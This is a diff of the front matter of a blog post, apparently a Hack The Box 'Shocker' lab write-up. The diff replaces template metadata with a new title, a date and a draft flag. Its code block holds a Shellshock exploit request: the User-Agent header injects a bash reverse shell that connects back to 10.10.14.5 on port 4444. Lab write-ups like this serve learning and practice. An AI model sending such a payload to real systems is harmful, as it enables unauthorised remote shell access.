@@ -1,18 +1,10 @@
 ---
-title: "Shocker Writeup"
-date: "2019-03-11"
-description: "Sample article showcasing basic Markdown syntax and formatting for HTML elements."
-FRtags: ["markdown", "css", "html", "themes"]
-FRcategories: ["themes", "syntax"]
-FRseries: ["Themes Guide"]
-aliases: ["migrate-from-jekyl"]
-ShowToc: true
-TocOpen: true
-weight: 2
+title: "Shocker Writeup HTB"
+date: 2022-12-16T21:49:08-08:00
+draft: true
 ---
 
 ```bash
-# Shocker
 GET /cgi-bin/user.sh HTTP/1.1
 Host: 10.10.10.56
 User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
